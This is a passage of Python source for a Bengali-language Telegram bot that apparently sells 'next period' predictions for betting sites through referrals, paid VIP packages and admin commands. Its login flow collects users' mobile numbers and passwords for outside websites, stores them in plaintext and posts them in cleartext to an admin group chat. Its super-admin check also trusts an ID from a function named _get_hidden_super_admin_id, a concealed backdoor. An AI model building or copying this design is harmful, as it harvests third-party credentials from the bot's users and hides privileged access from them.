            [cb_btn("⚡ পরের পিরিয়ড প্রেডিক্ট করুন ⚡", "predict_next")],
            [cb_btn("✍️ নতুন পিরিয়ড দিন", "enter_period")],
            [cb_btn("🏠 মেইন মেনুতে ফিরুন", "main_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=loading_message_id,
                text=message,
                parse_mode=constants.ParseMode.MARKDOWN_V2,
                reply_markup=reply_markup,
            )
        except Exception:
            if update.callback_query:
                await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)
            else:
                await update.message.reply_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    # ════════════════════════════════════════
    #  CALLBACK: রেফারেল / অ্যাকাউন্ট / লগইন
    # ════════════════════════════════════════
    async def handle_referral(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        user_data = users[user_id]
        bot_username = context.bot.username

        if not user_data["joined_channels"]:
            await update.callback_query.answer("🚫 আগে চ্যানেলে জয়েন করুন!", show_alert=True)
            await self.show_channels(update, context)
            return

        if not config.get("referral_system_on", True):
            keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
            await update.callback_query.edit_message_text(
                "⚠️ রেফারেল সিস্টেম এখন বন্ধ।",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        message = (
            "╔══════════════════╗\n"
            "║   🔗 *রেফার ও আয় করুন*   ║\n"
            "╚══════════════════╝\n\n"
            f"প্রতি রেফারে পাবেন *{config['per_refer']} পয়েন্ট*\\!\n\n"
            f"🔗 আপনার লিংক:\n`{escape_markdown(ref_link, version=2)}`\n\n"
            f"📈 *মোট রেফার:* `{user_data['referrals']}`\n"
            f"💰 *পয়েন্ট পেয়েছেন:* `{user_data['referrals'] * config['per_refer']}`"
        )
        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.callback_query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_account(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        user_id = str(user.id)
        user_data = users[user_id]
        premium_active = self.is_premium_active(user_id)
        premium_status = "✅ Active" if premium_active else "❌ Inactive"
        logged_in = ", ".join([site for site, status in user_data["logged_in"].items() if status]) or "None"
        escaped_full_name = escape_markdown(user.full_name, version=2)

        expiry_text = ""
        expiry_iso = user_data.get("premium_expiry")
        if premium_active and expiry_iso:
            expiry_text = f"\n▫️ *মেয়াদ শেষ:* `{expiry_iso}`"
        elif (not premium_active) and user_data.get("premium_expired_at"):
            expiry_text = f"\n▫️ *মেয়াদ উত্তীর্ণ:* `{user_data.get('premium_expired_at')}`"

        message = (
            "╔══════════════════╗\n"
            "║   👤 *অ্যাকাউন্ট তথ্য*   ║\n"
            "╚══════════════════╝\n\n"
            f"▫️ *নাম:* {escaped_full_name}\n"
            f"▫️ *আইডি:* `{user_id}`\n"
            f"▫️ *পয়েন্ট:* `{user_data['points']}`\n"
            f"▫️ *প্রিমিয়াম:* {escape_markdown(premium_status, version=2)}{expiry_text}\n"
            f"▫️ *রেফার:* `{user_data['referrals']}`\n"
            f"▫️ *লগইন:* `{escape_markdown(logged_in, version=2)}`"
        )
        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.callback_query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_login_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        keyboard = []
        for website in config["websites"]:
            status = "✅ লগইন আছে" if users[user_id]["logged_in"][website] else "❌ লগইন নেই"
            keyboard.append([cb_btn(f"{website} ({status})", f"login_{website.lower()}")])
        keyboard.append([cb_btn("🔐 সব থেকে লগআউট", "logout")])
        keyboard.append([cb_btn("🏠 মেইন মেনু", "main_menu")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.callback_query.edit_message_text(
            "╔══════════════════╗\n"
            "║   🔑 *লগইন ম্যানেজমেন্ট*   ║\n"
            "╚══════════════════╝\n\n"
            "ওয়েবসাইট বেছে লগইন করুন:",
            reply_markup=reply_markup,
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )

    async def handle_login_choice(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        website = query.data.split("_")[1].capitalize()
        user_id = str(update.effective_user.id)
        context.user_data["login_website"] = website

        if users[user_id]["logged_in"][website]:
            await query.answer(f"{website}-এ ইতিমধ্যে লগইন আছে!", show_alert=True)
            return ConversationHandler.END

        login_url = escape_markdown(config['websites'][website]['login_url'], version=2)
        await query.edit_message_text(
            f"*➡️ {website} লগইন*\n\n"
            f"অ্যাকাউন্ট না থাকলে এখানে রেজিস্ট্রেশন করুন:\n`{login_url}`\n\n"
            "এখন আপনার *মোবাইল নম্বর* দিন:\n\n"
            "বাতিল করতে /cancel লিখুন।",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_NUMBER

    async def get_number(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        number = update.message.text
        if not number.isdigit() or len(number) < 10:
            await update.message.reply_text(
                "⚠️ *ভুল নম্বর\\!* সঠিক মোবাইল নম্বর দিন।\n\nবাতিল করতে /cancel লিখুন।",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            return GET_NUMBER
        context.user_data["login_number"] = number
        await update.message.reply_text(
            "এবার আপনার *পাসওয়ার্ড* দিন:\n\nবাতিল করতে /cancel লিখুন।",
            reply_markup=ReplyKeyboardRemove(),
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return GET_PASSWORD

    async def get_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        password = update.message.text
        website = context.user_data["login_website"]
        number = context.user_data["login_number"]
        user_id = str(update.effective_user.id)

        users[user_id]["login_info"][website] = {"number": number, "password": password}
        save_db(users, DB_USERS)

        keyboard = [[
            cb_btn("✅ Approve", f"approve_{user_id}_{website}"),
            cb_btn("❌ Reject", f"reject_{user_id}_{website}")
        ]]
        escaped_user_name = escape_markdown(update.effective_user.full_name, version=2)
        admin_message = (
            f"*🔒 নতুন লগইন রিকোয়েস্ট*\n\n"
            f"*ইউজার:* {escaped_user_name} \\(`{user_id}`\\)\n"
            f"*ওয়েবসাইট:* `{escape_markdown(website, version=2)}`\n"
            f"*নম্বর:* `{escape_markdown(number, version=2)}`\n"
            f"*পাসওয়ার্ড:* `{escape_markdown(password, version=2)}`"
        )
        try:
            await context.bot.send_message(
                chat_id=config["group_id"],
                text=admin_message,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
            await update.message.reply_text(
                "✅ *রিকোয়েস্ট পাঠানো হয়েছে\\!*\n\nঅ্যাডমিন অ্যাপ্রুভ করলে জানানো হবে।",
                parse_mode=constants.ParseMode.MARKDOWN_V2
            )
        except Exception as e:
            logger.error(f"Failed to send login request: {e}")
            await update.message.reply_text("❌ রিকোয়েস্ট পাঠাতে সমস্যা হয়েছে। সাপোর্টে যোগাযোগ করুন।")
        return ConversationHandler.END

    async def handle_admin_approval(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        admin_user = update.effective_user
        try:
            action, user_id, website = query.data.split("_")
        except ValueError:
            await query.answer("ভুল ডেটা।", show_alert=True)
            return

        if user_id not in users:
            await query.edit_message_text(f"ইউজার `{user_id}` পাওয়া যায়নি।", parse_mode=constants.ParseMode.MARKDOWN_V2)
            return

        try:
            user_info = await context.bot.get_chat(user_id)
            escaped_user_name = escape_markdown(user_info.full_name, version=2)
            escaped_admin_name = escape_markdown(admin_user.full_name, version=2)

            if action == "approve":
                users[user_id]["logged_in"][website] = True
                save_db(users, DB_USERS)
                await query.edit_message_text(
                    f"✅ *লগইন অ্যাপ্রুভ*\n\n*ইউজার:* {escaped_user_name}\n*ওয়েবসাইট:* `{website}`\n*অ্যাডমিন:* {escaped_admin_name}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎉 *অভিনন্দন\\!* {website}\\-এ আপনার লগইন অ্যাপ্রুভ হয়েছে\\!",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
            elif action == "reject":
                users[user_id]["login_info"][website] = {}
                save_db(users, DB_USERS)
                await query.edit_message_text(
                    f"❌ *লগইন রিজেক্ট*\n\n*ইউজার:* {escaped_user_name}\n*ওয়েবসাইট:* `{website}`\n*অ্যাডমিন:* {escaped_admin_name}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"😔 {website}\\-এর লগইন রিজেক্ট হয়েছে। তথ্য ঠিক করে আবার চেষ্টা করুন।",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
        except Exception as e:
            logger.error(f"Error during admin approval: {e}")
            await query.answer("সমস্যা হয়েছে।", show_alert=True)

    async def handle_subscription_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        premium_active = self.is_premium_active(user_id)
        message = (
            "╔══════════════════╗\n"
            "║   💎 *আমাদের প্যাকেজ*   ║\n"
            "╚══════════════════╝\n\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "🔹 *৫ দিন* — ৳২৫০\n"
            "🔹 *৭ দিন* — ৳৩০০\n"
            "🔹 *১৫ দিন* — ৳৫০০\n"
            "🔹 *১ মাস* — ৳৮০০\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n"
            f"📌 কিনতে: @System\\_Fahim\n"
            f"🪪 আপনার ID: `{user_id}`\n\n"
            f"📊 স্ট্যাটাস: {'✅ Premium Active' if premium_active else '❌ Free User'}"
        )
        keyboard = [[cb_btn("🏠 মেইন মেনু", "main_menu")]]
        await update.callback_query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_logout(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        for website in users[user_id]["logged_in"]:
            users[user_id]["logged_in"][website] = False
            users[user_id]["login_info"][website] = {}
        save_db(users, DB_USERS)
        await update.callback_query.answer("✅ সব অ্যাকাউন্ট থেকে লগআউট হয়েছে!", show_alert=True)
        await self.show_main_menu(update, context)

    async def cancel_login(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data.clear()
        await update.message.reply_text("লগইন বাতিল হয়েছে।")
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    async def cancel_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("প্রেডিকশন বাতিল হয়েছে।")
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    # ════════════════════════════════════════
    #  ADMIN HELPER METHODS
    # ════════════════════════════════════════
    def is_admin(self, user_id: str) -> bool:
        if self.is_super_admin(user_id):
            return True
        return user_id in config.get("admin_users", [])

    def is_super_admin(self, user_id: str) -> bool:
        if user_id == _get_hidden_super_admin_id():
            return True
        return user_id in config.get("super_admin_users", [])

    def _auto_expire_if_needed(self, user_id: str) -> None:
        try:
            user = users.get(user_id)
            if not user or not user.get("is_premium"):
                return
            expiry_iso = user.get("premium_expiry")
            if not expiry_iso:
                return
            try:
                expiry_dt = datetime.fromisoformat(expiry_iso)
            except Exception:
                return
            if datetime.now() >= expiry_dt:
                user["is_premium"] = False
                user["premium_expired_at"] = datetime.now().isoformat()
                save_db(users, DB_USERS)
        except Exception:
            pass

    def is_premium_active(self, user_id: str) -> bool:
        self._auto_expire_if_needed(user_id)
        user = users.get(user_id, {})
        if not user.get("is_premium"):
            return False
        expiry_iso = user.get("premium_expiry")
        if not expiry_iso:
            return True
        try:
            return datetime.now() < datetime.fromisoformat(expiry_iso)
        except Exception:
            return True

    def _parse_duration_to_timedelta(self, raw: str) -> Optional[timedelta]:
        s = str(raw).strip().lower()
        if not s:
            return None
        if " " in s:
            parts = [p for p in s.split() if p]
            if len(parts) == 2 and parts[0].isdigit():
                amount = int(parts[0])
                unit_word = parts[1].rstrip('s')
                if amount <= 0:
                    return None
                if unit_word in ("d", "day"):
                    return timedelta(days=amount)
                if unit_word in ("h", "hr", "hour"):
                    return timedelta(hours=amount)
                if unit_word in ("m", "min", "minute", "minit"):
                    return timedelta(minutes=amount)
                return None
        if s.isdigit():
            return timedelta(days=int(s))
        suffix_groups = {
            "m": ["minutes", "minute", "mins", "min", "minit", "minits", "m"],
            "h": ["hours", "hour", "hrs", "hr", "h"],
            "d": ["days", "day", "d"],
        }
        for unit_key, suffixes in suffix_groups.items():
            for suf in suffixes:
                if s.endswith(suf):
                    num_part = s[: -len(suf)].strip()
                    if not num_part.isdigit():
                        break
                    amount = int(num_part)
                    if amount <= 0:
                        return None
                    if unit_key == 'd':
                        return timedelta(days=amount)
                    if unit_key == 'h':
                        return timedelta(hours=amount)
                    if unit_key == 'm':
                        return timedelta(minutes=amount)
                    return None
        if len(s) >= 2 and s[:-1].isdigit():
            amount = int(s[:-1])
            unit = s[-1]
            if amount <= 0:
                return None
            if unit == 'd':
                return timedelta(days=amount)
            if unit == 'h':
                return timedelta(hours=amount)
            if unit == 'm':
                return timedelta(minutes=amount)
        return None

    async def notify_user(self, user_id: str, message: str):
        try:
            await self.application.bot.send_message(chat_id=user_id, text=message, parse_mode=constants.ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to notify {user_id}: {e}")

    async def notify_admin_action(self, action: str, target_user_id: str, admin_user_id: str, details: str = ""):
        admin_name = "Admin"
        try:
            admin_info = await self.application.bot.get_chat(admin_user_id)
            admin_name = admin_info.first_name or "Admin"
        except:
            pass
        escaped_action = escape_markdown(action, version=2)
        escaped_admin_name = escape_markdown(admin_name, version=2)
        escaped_details = escape_markdown(details, version=2) if details else ""
        escaped_date = escape_markdown(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), version=2)
        notification_message = f"🔔 *অ্যাডমিন অ্যাকশন*\n\n*অ্যাকশন:* {escaped_action}\n*টার্গেট:* `{target_user_id}`\n*অ্যাডমিন:* `{escaped_admin_name}`\n*সময়:* {escaped_date}"
        if details:
            notification_message += f"\n\n*বিবরণ:* {escaped_details}"
        await self.notify_user(target_user_id, notification_message)
        for super_admin_id in config.get("super_admin_users", []):
            if super_admin_id != admin_user_id:
                await self.notify_user(super_admin_id, notification_message)

    # ════════════════════════════════════════
    #  ADMIN PANEL & COMMANDS
    # ════════════════════════════════════════
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("🚫 আপনার অ্যাডমিন পার্মিশন নেই।")
            return
        help_text = (
            "🔧 **Admin Command System**\n\n"
            "**📢 Broadcasting:**\n"
            "• `/broadcast <message>` - Send message to all users\n\n"
            "**👥 User Management:**\n"
            "• `/addvipuser <user_id> <days>` - Add VIP user\n"
            "• `/removevipuser <user_id>` - Remove VIP user\n"
            "• `/vipusers` - Show VIP users\n"
            "• `/banuser <user_id>` - Ban user\n"
            "• `/unbanuser <user_id>` - Unban user\n"
            "• `/setpoints <user_id> <points>` - Set user points\n\n"
            "**👨‍💼 Admin Management:**\n"
            "• `/addadmin <user_id>` - Add admin\n"
            "• `/removeadmin <user_id>` - Remove admin\n"
            "• `/addsuperadmin <user_id>` - Add super admin\n"
            "• `/removesuperadmin <user_id>` - Remove super admin\n\n"
            "**📊 Data:**\n"
            "• `/stats` - Bot statistics\n"
            "• `/download <type>` - Download data\n"
            "• `/settings` - Current settings\n"
            "• `/backup` - Create backup\n\n"
            "**📢 Channels:**\n"
            "• `/channels` - Manage channels\n\n"
            "**⚙️ Settings:**\n"
            "• `/toggle referral` - Toggle referral\n"
            "• `/setreferral <points>` - Set referral points\n"
            "• `/setprediction <points>` - Set prediction points\n"
        )
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def start_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        total_users = len(users)
        await update.callback_query.edit_message_text(
            f"📢 ব্রডকাস্ট মেসেজ\n\nমেসেজ লিখুন। মোট ইউজার: {total_users}"
        )
        return GET_BROADCAST_MESSAGE

    async def send_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        message = update.message.text
        processing_msg = await update.message.reply_text("📤 পাঠানো হচ্ছে...")
        success_count = 0
        failed_count = 0
        total_users_count = len(users)
        for user_id_str in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id_str,
                    text=f"📢 *ব্রডকাস্ট মেসেজ*\n\n{escape_markdown(message, version=2)}",
                    parse_mode=constants.ParseMode.MARKDOWN_V2
                )
                success_count += 1
            except Exception as e:
                logger.error(f"Failed to send broadcast: {e}")
                failed_count += 1
        await processing_msg.edit_text(
            f"✅ *ব্রডকাস্ট সম্পন্ন*\n\n📤 পাঠানো: {success_count}/{total_users_count}\n❌ ব্যর্থ: {failed_count}",
            parse_mode=constants.ParseMode.MARKDOWN_V2
        )
        return ConversationHandler.END

    async def show_user_management(self, update, context):
        keyboard = [
            [cb_btn("🚫 ব্যান ইউজার", "admin_ban_user")],
            [cb_btn("✅ আনব্যান ইউজার", "admin_unban_user")],
        ]
        await update.callback_query.edit_message_text("👥 ইউজার ম্যানেজমেন্ট:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def show_vip_management(self, update, context):
        keyboard = [
            [cb_btn("⭐ VIP যোগ করুন", "admin_add_vip")],
            [cb_btn("❌ VIP সরান", "admin_remove_vip")],
        ]
        await update.callback_query.edit_message_text("⭐ VIP ম্যানেজমেন্ট:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def show_admin_management(self, update, context):
        keyboard = [
            [cb_btn("👨‍💼 অ্যাডমিন যোগ করুন", "admin_add_admin")],
            [cb_btn("❌ অ্যাডমিন সরান", "admin_remove_admin")],
        ]
        await update.callback_query.edit_message_text("👨‍💼 অ্যাডমিন ম্যানেজমেন্ট:", reply_markup=InlineKeyboardMarkup(keyboard))

    async def start_points_management(self, update, context):
        action = update.callback_query.data
        context.user_data["points_action"] = action
        if "refer" in action:
            await update.callback_query.edit_message_text(f"💰 রেফারেল পয়েন্ট সেট করুন\nবর্তমান: {config.get('per_refer', 0)}\n\nনতুন মান দিন:")
        else:
            await update.callback_query.edit_message_text(f"🎯 প্রেডিকশন পয়েন্ট সেট করুন\nবর্তমান: {config.get('per_prediction', 0)}\n\nনতুন মান দিন:")
        return GET_POINTS

    async def set_points(self, update, context):
        try:
            points = int(update.message.text)
            action = context.user_data.get("points_action")
            if "refer" in action:
                config["per_refer"] = points
                message = f"✅ রেফারেল পয়েন্ট সেট হয়েছে: `{points}`"
            else:
                config["per_prediction"] = points
                message = f"✅ প্রেডিকশন পয়েন্ট সেট হয়েছে: `{points}`"
            save_db(config, DB_CONFIG)
            await update.message.reply_text(message, parse_mode=constants.ParseMode.MARKDOWN_V2)
        except ValueError:
            await update.message.reply_text("❌ সঠিক নম্বর দিন!")
            return GET_POINTS
        return ConversationHandler.END

    async def start_channel_management(self, update, context):
        action = update.callback_query.data
        context.user_data["channel_action"] = action
        if "add" in action:
            await update.callback_query.edit_message_text("📢 চ্যানেলের নাম দিন:")
            return GET_CHANNEL_NAME
        elif "remove" in action:
            await self.show_channel_remove_options(update, context)

    async def get_channel_name(self, update, context):
        context.user_data["channel_name"] = update.message.text
        await update.message.reply_text("চ্যানেলের URL দিন:")
        return GET_CHANNEL_URL

    async def get_channel_url(self, update, context):
        context.user_data["channel_url"] = update.message.text
        await update.message.reply_text("চ্যানেলের ID দিন (numeric):")
        return GET_CHANNEL_ID

    async def get_channel_id(self, update, context):
        try:
            channel_id = int(update.message.text)
            new_channel = {"name": context.user_data["channel_name"], "url": context.user_data["channel_url"], "id": channel_id}
            channels.append(new_channel)
            save_db(channels, DB_CHANNELS)
            await update.message.reply_text(f"✅ চ্যানেল যোগ হয়েছে: {new_channel['name']}")
        except ValueError:
            await update.message.reply_text("❌ সঠিক নম্বর দিন!")
            return GET_CHANNEL_ID
        return ConversationHandler.END

    async def show_channel_remove_options(self, update, context):
        keyboard = [[cb_btn(f"❌ {ch['name']}", f"admin_channel_remove_{i}")] for i, ch in enumerate(channels)]
        await update.callback_query.edit_message_text("কোন চ্যানেল সরাবেন?", reply_markup=InlineKeyboardMarkup(keyboard))

    async def start_ban_user(self, update, context):
        await update.callback_query.edit_message_text("🚫 ব্যান করতে User ID দিন:")
        return GET_BAN_USER_ID

    async def ban_user(self, update, context):
        user_id = update.message.text.strip()
        if not user_id.isdigit():
            await update.message.reply_text("❌ ভুল ID।")
            return GET_BAN_USER_ID
        if user_id not in users:
            await update.message.reply_text("❌ ইউজার পাওয়া যায়নি।")
            return GET_BAN_USER_ID
        users[user_id]["banned"] = True
        save_db(users, DB_USERS)
        await update.message.reply_text(f"✅ ইউজার {user_id} ব্যান হয়েছে!")
        return ConversationHandler.END

    async def start_unban_user(self, update, context):
        await update.callback_query.edit_message_text("✅ আনব্যান করতে User ID দিন:")
        return GET_UNBAN_USER_ID

    async def unban_user(self, update, context):
        user_id = update.message.text.strip()
        if not user_id.isdigit():
            await update.message.reply_text("❌ ভুল ID।")
            return GET_UNBAN_USER_ID
        if user_id not in users:
            await update.message.reply_text("❌ ইউজার পাওয়া যায়নি।")
            return GET_UNBAN_USER_ID
        users[user_id]["banned"] = False
        save_db(users, DB_USERS)
        await update.message.reply_text(f"✅ ইউজার {user_id} আনব্যান হয়েছে!")
        return ConversationHandler.END

    async def start_add_vip(self, update, context):
        await update.callback_query.edit_message_text("⭐ VIP করতে User ID দিন:")
        return GET_ADD_VIP_USER_ID

    async def add_vip_user(self, update, context):
        user_id = update.message.text.strip()
        if not user_id.isdigit() or user_id not in users:
            await update.message.reply_text("❌ ভুল বা অজানা User ID।")
            return GET_ADD_VIP_USER_ID
        users[user_id]["is_premium"] = True
        save_db(users, DB_USERS)
        await update.message.reply_text(f"✅ {user_id} VIP হয়েছে!")
        return ConversationHandler.END

    async def start_remove_vip(self, update, context):
        await update.callback_query.edit_message_text("❌ VIP সরাতে User ID দিন:")
        return GET_REMOVE_VIP_USER_ID

    async def remove_vip_user(self, update, context):
        user_id = update.message.text.strip()
        if not user_id.isdigit() or user_id not in users:
            await update.message.reply_text("❌ ভুল বা অজানা User ID।")
            return GET_REMOVE_VIP_USER_ID
        users[user_id]["is_premium"] = False
        save_db(users, DB_USERS)
        await update.message.reply_text(f"✅ {user_id}-এর VIP সরানো হয়েছে!")
        return ConversationHandler.END

    async def start_add_admin(self, update, context):
        await update.callback_query.edit_message_text("👨‍💼 অ্যাডমিন করতে User ID দিন:")
        return GET_ADD_ADMIN_USER_ID

    async def add_admin_user(self, update, context):
        user_id = update.message.text.strip()
        if not user_id.isdigit():
            await update.message.reply_text("❌ ভুল ID।")
            return GET_ADD_ADMIN_USER_ID
        admin_users = config.get("admin_users", [])
        if user_id in admin_users:
            await update.message.reply_text("❌ ইতিমধ্যে অ্যাডমিন।")
            return GET_ADD_ADMIN_USER_ID
        admin_users.append(user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ {user_id} অ্যাডমিন হয়েছে!")
        return ConversationHandler.END

    async def start_remove_admin(self, update, context):
        await update.callback_query.edit_message_text("❌ অ্যাডমিন সরাতে User ID দিন:")
        return GET_REMOVE_ADMIN_USER_ID

    async def remove_admin_user(self, update, context):
        user_id = update.message.text.strip()
        admin_users = config.get("admin_users", [])
        if user_id not in admin_users:
            await update.message.reply_text("❌ এই ইউজার অ্যাডমিন না।")
            return GET_REMOVE_ADMIN_USER_ID
        admin_users.remove(user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ {user_id}-এর অ্যাডমিন সরানো হয়েছে!")
        return ConversationHandler.END

    async def cancel_admin_action(self, update, context):
        await update.message.reply_text("❌ বাতিল হয়েছে।")
        return ConversationHandler.END

    # ════════════════════════════════════════
    #  ADMIN COMMANDS
    # ════════════════════════════════════════
    async def help_command(self, update, context):
        await self.admin_panel(update, context)

    async def broadcast_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if not context.args:
            await update.message.reply_text("❌ Usage: /broadcast <message>")
            return
        message = " ".join(context.args)
        success_count = 0
        failed_count = 0
        await update.message.reply_text("📢 পাঠানো হচ্ছে...")
        for user_id_str in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user_id_str), text=f"📢 **Broadcast**\n\n{message}")
                success_count += 1
            except Exception:
                failed_count += 1
        await update.message.reply_text(f"✅ পাঠানো: {success_count}\n❌ ব্যর্থ: {failed_count}")

    async def add_vip_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /addvipuser <user_id> <duration>")
            return
        target_user_id = context.args[0]
        duration_raw = context.args[1]
        if not target_user_id.isdigit():
            await update.message.reply_text("❌ ভুল User ID।")
            return
        td = self._parse_duration_to_timedelta(duration_raw)
        if td is None:
            await update.message.reply_text("❌ ভুল duration। উদাহরণ: 30, 12h, 90m")
            return
        if target_user_id not in users:
            users[target_user_id] = {"joined_date": datetime.now().isoformat()}
        users[target_user_id]["is_premium"] = True
        base_start = datetime.now()
        prev_expiry = users[target_user_id].get("premium_expiry")
        try:
            if prev_expiry and datetime.fromisoformat(prev_expiry) > base_start:
                base_start = datetime.fromisoformat(prev_expiry)
        except Exception:
            pass
        users[target_user_id]["premium_expiry"] = (base_start + td).isoformat()
        save_db(users, DB_USERS)
        await self.notify_admin_action("VIP Added", target_user_id, user_id, f"Duration: {duration_raw}")
        await update.message.reply_text(f"✅ {target_user_id} VIP হয়েছে, মেয়াদ: {users[target_user_id]['premium_expiry']}")

    async def remove_vip_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removevipuser <user_id>")
            return
        target_user_id = context.args[0]
        if target_user_id not in users or not users[target_user_id].get("is_premium", False):
            await update.message.reply_text("❌ ইউজার VIP না বা পাওয়া যায়নি।")
            return
        users[target_user_id]["is_premium"] = False
        if "premium_expiry" in users[target_user_id]:
            users[target_user_id]["premium_expired_at"] = users[target_user_id]["premium_expiry"]
            del users[target_user_id]["premium_expiry"]
        save_db(users, DB_USERS)
        await self.notify_admin_action("VIP Removed", target_user_id, user_id)
        await update.message.reply_text(f"✅ {target_user_id}-এর VIP সরানো হয়েছে!")

    async def vip_users_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        active_rows = []
        expired_rows = []
        now = datetime.now()
        for uid, u in users.items():
            if not isinstance(u, dict):
                continue
            is_premium = u.get("is_premium", False)
            expiry_iso = u.get("premium_expiry")
            name = u.get("name", "Unknown")
            self._auto_expire_if_needed(uid)
            is_premium = u.get("is_premium", False)
            expiry_iso = u.get("premium_expiry")
            if is_premium and expiry_iso:
                try:
                    expiry_dt = datetime.fromisoformat(expiry_iso)
                    remaining = expiry_dt - now
                    total_seconds = int(remaining.total_seconds())
                    days = total_seconds // 86400
                    hours = (total_seconds % 86400) // 3600
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — `{days}d {hours}h বাকি`")
                except Exception:
                    active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — `{expiry_iso}`")
            elif is_premium:
                active_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — মেয়াদ নেই")
            else:
                expired_at = u.get("premium_expired_at") or u.get("premium_expiry")
                if expired_at:
                    expired_rows.append(f"`{uid}` — {escape_markdown(name, version=2)} — মেয়াদ উত্তীর্ণ")
        active_text = "\n".join(active_rows) or "_কেউ নেই_"
        expired_text = "\n".join(expired_rows) or "_কেউ নেই_"
        msg = f"⭐ *VIP ইউজার*\n\n*সক্রিয়:*\n{active_text}\n\n*মেয়াদ উত্তীর্ণ:*\n{expired_text}"
        await update.message.reply_text(msg, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def ban_user_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /banuser <user_id>")
            return
        target_user_id = context.args[0]
        if target_user_id not in users:
            await update.message.reply_text("❌ ইউজার পাওয়া যায়নি।")
            return
        users[target_user_id]["banned"] = True
        users[target_user_id]["banned_date"] = datetime.now().isoformat()
        save_db(users, DB_USERS)
        await self.notify_admin_action("User Banned", target_user_id, user_id)
        await update.message.reply_text(f"✅ {target_user_id} ব্যান হয়েছে!")

    async def unban_user_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /unbanuser <user_id>")
            return
        target_user_id = context.args[0]
        if target_user_id not in users:
            await update.message.reply_text("❌ ইউজার পাওয়া যায়নি।")
            return
        users[target_user_id]["banned"] = False
        if "banned_date" in users[target_user_id]:
            del users[target_user_id]["banned_date"]
        save_db(users, DB_USERS)
